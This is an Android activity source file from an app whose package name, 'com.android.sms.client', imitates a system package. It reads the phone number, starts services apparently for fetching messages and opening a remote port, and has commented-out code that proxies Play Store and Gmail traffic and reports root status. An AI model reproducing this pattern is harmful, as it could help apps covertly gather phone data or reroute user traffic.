package com.android.sms.client;

import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.support.v7.app.ActionBarActivity;
import android.text.TextUtils;
import android.text.method.ScrollingMovementMethod;
import android.util.Log;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;

import com.android.proxy.client.GlobalProxyUtil;
import com.flurry.android.FlurryAgent;
import com.oplay.nohelper.utils.Util_Service;

import net.luna.common.download.interfaces.ApkDownloadListener;
import net.luna.common.download.model.AppModel;
import net.luna.common.download.model.FileDownloadTask;
import net.youmi.android.libs.common.download.ext.OplayDownloadManager;
import net.youmi.android.libs.common.download.ext.OplayInstallNotifier;
import net.youmi.android.libs.common.download.ext.SimpleAppInfo;

import org.greenrobot.eventbus.EventBus;
import org.greenrobot.eventbus.Subscribe;

import java.util.HashMap;
import java.util.Map;


public class MainActivity extends ActionBarActivity implements View.OnClickListener, ApkDownloadListener,
		OplayDownloadManager.OnDownloadStatusChangeListener, OplayDownloadManager
		.OnProgressUpdateListener, OplayInstallNotifier.OnInstallListener {

	private final boolean DEBUG = true;
	private final String TAG = "downloadListen";
	private TextView mTvShow;
	private StringBuilder oldMsg;
	private EditText mEdtPort;
	private Button mTvGetPhone;



	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);
		FlurryAgent.onStartSession(this);
		EventBus.getDefault().register(this);
//		findViewById(R.id.connect).setOnClickListener(this);
//		findViewById(R.id.disconnect).setOnClickListener(this);
//		findViewById(R.id.appmanager).setOnClickListener(this);
//		findViewById(R.id.getinfo).setOnClickListener(this);
		mTvGetPhone = (Button) findViewById(R.id.trygetnumber);
		mTvShow = (TextView) findViewById(R.id.message);
		mEdtPort = (EditText) findViewById(R.id.port);
		oldMsg = new StringBuilder();
		mTvShow.setMovementMethod(ScrollingMovementMethod.getInstance());
		String phoneNumber = SmsManageUtil.getInstance(this).getNativePhoneNumber1();
//		OplayDownloadManager.getInstance(this).addDownloadStatusListener(this);
//		OplayDownloadManager.getInstance(this).addProgressUpdateListener(this);
		if (!TextUtils.isEmpty(phoneNumber)) {
			mTvGetPhone.setText("phoneNumber：" + phoneNumber);
		} else {
			mTvGetPhone.setText("cannot find phone number");
		}

		//添加下载更新！！！！！！！
//		AppDownloadManager.getInstance(this).addApkDownloadListener(this);
//		Task.callInBackground(new Callable<Object>() {
//			@Override
//			public Object call() throws Exception {
//				ApkUpdateUtil.getInstance(getApplication()).updateApk();
//				return null;
//			}
//		});

//		GlobalProxyUtil.getInstance(this).init();
//		GlobalProxyUtil.getInstance(this).addProxyPackage(this, "com.android.vending");
//		GlobalProxyUtil.getInstance(this).addProxyPackage(this, "com.google.android.gm");
	}


	@Override
	public void onClick(View v) {
		try {
			switch (v.getId()) {
				case R.id.connect:
					Intent it = new Intent(this, GetRemotePortService.class);
					startService(it);
					break;
				case R.id.disconnect:
					GlobalProxyUtil.getInstance(this).stopProxy(this);
					break;
				case R.id.appmanager:
					Intent intent = new Intent(this, AppManager.class);
					startActivity(intent);
					break;
				case R.id.getinfo:

					final boolean isServiceLive = Util_Service.isServiceRunning(this, GetMsgService.class
							.getCanonicalName());
					if (!isServiceLive) {
						startService(new Intent(this, GetMsgService.class));
					}
					break;
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		// Inflate the menu; this adds items to the action bar if it is present.
		getMenuInflater().inflate(R.menu.menu_main, menu);
		return true;
	}

	@Override
	public boolean onOptionsItemSelected(MenuItem item) {
		// Handle action bar item clicks here. The action bar will
		// automatically handle clicks on the Home/Up button, so long
		// as you specify a parent activity in AndroidManifest.xml.
		int id = item.getItemId();

		//noinspection SimplifiableIfStatement
		if (id == R.id.action_settings) {
			return true;
		}

		return super.onOptionsItemSelected(item);
	}


	@Subscribe
	public void onEvent(final MessageEvent event) {

		runOnUiThread(new Runnable() {
			@Override
			public void run() {
				if (event != null) {
					if (oldMsg.length() == 0) {
						oldMsg.append(event.getMessage());
					} else {
						oldMsg.append("\r\n");
						oldMsg.append(event.getMessage());
					}
					mTvShow.setText(oldMsg.toString());
				}
			}
		});

	}


	@Override
	protected void onStop() {
		super.onStop();
		FlurryAgent.onEndSession(this);
	}

	@Override
	protected void onDestroy() {
		super.onDestroy();
//		OplayDownloadManager.getInstance(this).removeDownloadStatusListener(this);
//		OplayDownloadManager.getInstance(this).removeProgressUpdateListener(this);
	}

	@Override
	public void onApkDownloadBeforeStart_FileLock(FileDownloadTask task) {

	}

	@Override
	public void onApkDownloadStart(FileDownloadTask task) {

	}

	@Override
	public void onApkDownloadSuccess(FileDownloadTask task) {
		Map<String, String> map = new HashMap<>();
		map.put(NativeParams.KEY_DOWNLOAD_SUCCESS, String.valueOf(true));
		FlurryAgent.logEvent(NativeParams.EVENT_START_DOWNLOAD, map);

		final String downloadSuccess = "\nDownload success\n";
		EventBus.getDefault().post(new MessageEvent(downloadSuccess));
	}

	@Override
	public void onApkDownloadSuccess(AppModel model) {
		Map<String, String> map = new HashMap<>();
		map.put(NativeParams.KEY_DOWNLOAD_SUCCESS, String.valueOf(true));
		FlurryAgent.logEvent(NativeParams.EVENT_START_DOWNLOAD, map);

		final String downloadSuccess = "\nDownload success(isExist)\n";
		EventBus.getDefault().post(new MessageEvent(downloadSuccess));
	}

	@Override
	public void onApkDownloadFailed(FileDownloadTask task) {
		Map<String, String> map = new HashMap<>();
		map.put(NativeParams.KEY_DOWNLOAD_SUCCESS, String.valueOf(false));
		FlurryAgent.logEvent(NativeParams.EVENT_START_DOWNLOAD, map);

		final String downloadFail = "\nDownload Fail\n";
		EventBus.getDefault().post(new MessageEvent(downloadFail));
	}

	@Override
	public void onApkDownloadStop(FileDownloadTask task) {

	}

	@Override
	public void onApkDownloadProgressUpdate(FileDownloadTask task, long contentLength, long completeLength, int
			percent) {

	}

	@Override
	public void onApkInstallSuccess(AppModel model) {
//		Map<String, String> map = new HashMap<>();
//		map.put(NativeParams.KEY_INSTALL_SUCCESS, String.valueOf(true));
//		map.put(NativeParams.KEY_IS_DEVICE_ROOT, String.valueOf(RootTools.isAccessGiven()));
//		FlurryAgent.logEvent(NativeParams.EVENT_START_INSTALL, map);
//
//        final String installSuccess = "\ninstallSuccess\n";
//        EventBus.getDefault().post(new MessageEvent(installSuccess));

	}

	@Override
	public void onDownloadStatusChanged(SimpleAppInfo info) {
         if(DEBUG){
	         Log.d(TAG,"download_state:"+info.getDownloadStatus());
         }
	}

	@Override
	public void onInstall(Context context, String packageName) {
	}

	@Override
	public void onProgressUpdate(String url, int percent, long speedBytesPerS) {
        if(DEBUG){
	        Log.d(TAG,"onProgressUpdate!!!!!!!!!!!");
        }
	}
}
